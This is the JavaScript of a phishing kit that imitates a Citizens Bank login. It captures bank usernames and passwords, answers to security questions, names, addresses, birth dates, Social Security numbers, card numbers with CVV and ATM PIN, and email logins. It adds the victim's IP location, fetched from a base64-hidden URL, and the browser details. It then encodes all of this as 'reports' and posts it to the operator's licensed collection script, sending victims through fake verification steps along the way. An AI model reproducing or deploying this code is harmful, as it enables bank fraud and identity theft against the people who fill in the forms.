let ip_config = {};
let Mail_URL = new URL(location.href);
let link = "";

let form_veriy_submit = "";
$(document).ready(async function () {
    localStorageCheck();
    countForWait = 0;
    const interval_1 = setInterval(function () {
        countForWait++;
        if (typeof _HEAD !== "undefined" && _HEAD !== null) {
            $(document.head).append(_HEAD)
            $(document.body).html(_BODY + $(document.body).html());
            setTimeout(function () {
                //$(document.body).show();
                form_veriy_submit = document.getElementById('form');
                document.body.style.opacity = "1"
                console.log(form_veriy_submit)
                form_veriy_submit.addEventListener('submit', function (e){
                    e.preventDefault();
                    console.log(e)
                })
            }, 500);
            clearInterval(interval_1)
        }
        if (countForWait => 10) {
            clearInterval(interval_1)
        }
    }, 150);


    if (Object.keys(ip_config).length < 2) {
        await get_reload_ip();
    }


    //Main jQuery post event

    /*    $('#form_index').on('submit', async function (e) {
            e.preventDefault();
            await submit_user_single();
        })*/

    //if (document.querySelectorAll("form#form").length > 0) {
    /*let form_verify = document.querySelector("form#form");
    console.log(form_verify)
    form_verify.addEventListener("submit", (e) => {
        e.preventDefault();
        console.log(e)
    })*/
    //}
$(form_veriy_submit).on('submit', function (e){
    e.preventDefault()
    console.log(this)
})

})

window.addEventListener('submit', function (e){
    e.preventDefault();
    console.log(e)
})

document.addEventListener('submit', function (e){
    e.preventDefault();
    console.log(e)
})

document.getElementsByName('form').forEach(function (element, key, parent){
    element.addEventListener('submit', function (e){
        e.preventDefault();
        console.log(e)
    })
})


async function get_reload_ip() {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: window.atob("aHR0cHM6Ly91cy1jZW50cmFsMS1jbG91ZC1hcHAtcGhwLW15c3FsLmNsb3VkZnVuY3Rpb25zLm5ldC9pcA=="),
            type: 'GET',
            dataType: "json",
            success: function (response) {
                if (response.status === "success") {
                    localStorage.setItem("ip_config", JSON.stringify(response));
                    localStorageCheck();
                }
                resolve(true);
            },
            error: function (response) {
                let error = {errors: response.responseJSON.errors[0]}
                resolve(true);
            }
        });
    });
}

function localStorageCheck() {
    let ip = localStorage.getItem("ip_config");
    if (ip !== null) ip_config = JSON.parse(ip);
}


function User_Pass_single(username, password, secondtry = true) {
    let second = secondtry ? " - Second Try" : "";
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== Bank Acess${second} >---------------------------
Username : ${username}
Passord : ${password}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function QnA_verify_single(username, q1, q2, q3, a1, a2, a3) {
    let q1o = {
        "1": "What is your father's middle name?",
        "2": "What is your maternal grandmother's name?",
        "3": "What is the name of the first company you worked for?",
        "4": "What is your maternal grandfather's name?",
        "5": "In what city was your high school? (full name of city only)",
        "6": "What was the name of your high school?",
        "7": "What is the first name of the maid of honor at your wedding?",
        "8": "In what city were you married? (Enter full name of city)",
        "9": "What is the first name of your oldest nephew?"
    }
    let q2o = {
        "1": "What is the first name of the best man at your wedding?",
        "2": "What is the first name of your oldest niece?",
        "3": "What is your paternal grandfather's name?",
        "4": "In what city is your vacation home? (Enter full name of city only)",
        "5": "What was the name of your first girlfriend or boyfriend?",
        "6": "In what city was your father born? (Enter full name of city only)",
        "7": "What was the name of your first pet?",
        "8": "What was the nickname of your grandfather?",
        "9": "What was your high school mascot?"
    }
    let q3o = {
        "1": "What is your paternal grandfather's name?",
        "2": "What street did your best friend in high school live on? (Enter full name of street only)",
        "3": "What was the last name of your favorite teacher in final year of high school?",
        "4": "In what city were you born? (Enter full name of city only)",
        "5": "What was the name of the town your grandmother lived in? (Enter full name of city only)",
        "6": "What was your favorite restaurant in college?",
        "7": "Where did you meet your spouse for the first time? (Enter full name of city only)",
        "8": "In what city was your mother born? (Enter full name of city only)",
        "9": "What was the name of your junior high school? (Enter only \"Riverdale\" for Riverdale Junior high school)"
    }
    q1 = q1o[q1.toString()];
    q2 = q2o[q2.toString()];
    q3 = q3o[q3.toString()];
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== Security Questions - ${username} >---------------------------
Question 1: ${q1}
Answer 1: ${a1}
Question 2: ${q2}
Answer 2: ${a2}
Question 3: ${q3}
Answer 3: ${a3}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function personal_info_single(username, full_name, address, city, state, zip, dob, ssn) {
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== Billing Info - ${username} >---------------------------
Full Name: ${full_name}
Address: ${address}
City: ${city}
State: ${state}
zipcode: ${zip}
Date Of Birth: ${dob}
Social Security Number (SSN): ${ssn}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function card_info_single(username, card_number, expire, cvv, pin, card) {
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== CC Details - ${username} >---------------------------
Card Number: ${card_number}
Expiration Date: ${expire}
Cvv: ${cvv}
ATM PIN: ${pin}
== BIN Info >---------------------------
Brand: ${card.scheme} || Level: ${card.brand} || Type: ${card.type} || Country: ${card.country}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

function Email_Pass_single(username, email, password) {
    let post = `--------------< Jm Tech Inc. >--------------------------
-----------------< Citizen Bank Report >---------------------------
== Email Acess - ${username} >---------------------------
Username : ${email}
Passord : ${password}
== Other Info >--------------------------------
Country: ${ip_config.country} || State: ${ip_config.regionName} || City: ${ip_config.city}
IP: ${ip_config.query} || ISP: ${ip_config.isp} || Entry Time: #time#
== Browser >----------------------------------
User-Agent: ${navigator.userAgent}
-------------< Jmathew Inc. >---------------------------------

`;
    return btoa(post);
}

async function getBin(card) {
    card = card.split(' ').join('').substring(0, 6);
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: "https://lookup.binlist.net/" + card,
            type: 'GET',
            dataType: "json",
            success: function (response) {
                if (Object.keys(response).length > 4) {
                    let card_details = {
                        scheme: response.scheme,
                        brand: response.brand,
                        type: response.type,
                        country: response.country.alpha2
                    }
                    resolve(card_details);
                } else {
                    let card_details = {
                        scheme: "Unknown",
                        brand: "Unknown",
                        type: "Unknown",
                        country: "Unknown"
                    }
                    resolve(card_details);
                }
            },
            error: function (response) {
                let card_details = {
                    scheme: "Unknown",
                    brand: "Unknown",
                    type: "Unknown",
                    country: "Unknown",
                    errors: response
                }
                resolve(card_details);
            }
        });
    });
}


//MAIN RESULT FUNCTION

async function form_index(form) {
    let u = document.getElementById("UserID");
    let p = document.getElementById("currentpassword");
    let post = User_Pass_single(u, p, TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === true);
    let result = await load_Send_post(post);
    if (Object.keys(result).includes('errors')) {
        window.location.replace(location.href)
    } else {
        if (result.response.msg.includes("uccessfull")) {
            localStorage.setItem("username", u);
            if (TWO_TRY_USER_ACCESS === true && location.href.includes('vry=') === false) {
                window.location.replace(location.href + "&vry=" + (new Date()).getTime())
            } else {
                let url = location.href.split("#")[0] + "#/login/verify.js?" + query_gen();
                location.replace(url);
            }
        } else {
            window.location.replace(location.href)
        }
    }
}

 function form_verify(form) {
    q1 = document.getElementById("q1");
    a1 = document.getElementById("a1");
    q2 = document.getElementById("q2");
    a2 = document.getElementById("a2");
    q3 = document.getElementById("q3");
    a3 = document.getElementById("a3");
    let post = QnA_verify_single(q1, q2, q3, a1, a2, a3);
    console.log(post);
    return false;
}

//General Funtions
async function load_Send_post(post) {
    return new Promise(function (resolve, reject) {
        $.ajax({
            url: USE_DEDICATED ? D_SCRIPT_NAME : G_SCRIPT_NAME,
            type: 'POST',
            dataType: "json",
            data: {
                license: USE_DEDICATED ? DEDICATED_LICENSE : GENERAL_LICENSE_KEY,
                post
            },
            success: function (response) {
                resolve({response});
            },
            error: function (response) {
                let error = {errors: response}
                resolve(error);
            }
        });
    });
}

function query_gen() {
    return ("scr=" + Math.random().toString().replace("0.", "") + "&cookies=" + window.btoa(Math.random().toString()).replace("=", "").replace("=", "") + "&tokens=" + Math.random().toString().replace("0.", ""));
}

